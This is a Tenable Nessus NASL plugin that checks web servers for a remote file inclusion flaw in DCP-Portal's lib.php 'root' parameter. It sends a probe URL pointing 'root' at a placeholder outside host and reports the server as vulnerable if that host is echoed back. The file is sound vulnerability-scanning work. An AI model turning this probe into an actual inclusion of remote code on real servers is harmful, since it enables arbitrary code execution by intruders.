#
# (C) Tenable Network Security, Inc.
#

# DCP-Portal Cross Site Scripting Bugs
#
# From: "Frog Man" <leseulfrog@hotmail.com>
# To: bugtraq@securityfocus.com
# Subject: DCP-Portal (PHP)


include("compat.inc");


if (description)
{
 script_id(11476);
 script_version ("$Revision: 1.15 $");
 script_bugtraq_id(6525);
 script_xref(name:"Secunia", value:"7834");
 script_xref(name:"OSVDB", value:"7026");
 
 script_name(english:"DCP-Portal lib.php root Parameter Remote File Inclusion");
 script_summary(english:"Determine if DCP-Portal is vulnerable to an injection attack");

 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "An application running on the remote web server has a remote file\n",
     "include vulnerability."
   )
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "DCP-Portal has a remote file include vulnerability.  A remote\n",
     "attacker could exploit this to execute arbitrary PHP code in the\n",
     "context of the web server."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://www.securityfocus.com/archive/1/305358"
 );
 script_set_attribute(
   attribute:"solution", 
   value:string(
     "There is no known solution at this time.  It appears this application\n",
     "has not been actively maintained for several years."
   )
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
 );
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");

 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");

 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);

if(!can_host_php(port:port))exit(0);

foreach d (cgi_dirs())
{
 url = string(d, "/library/lib.php?root=http://xxxxxxxxxxx");
 buf = http_send_recv3(method:"GET", item:url, port:port);
 if (isnull(buf)) exit(0);
 
 if ("http://xxxxxxxxxxx/lib_nav.php" >< buf[2])
 {
   security_hole(port);
   exit(0);
 }
}

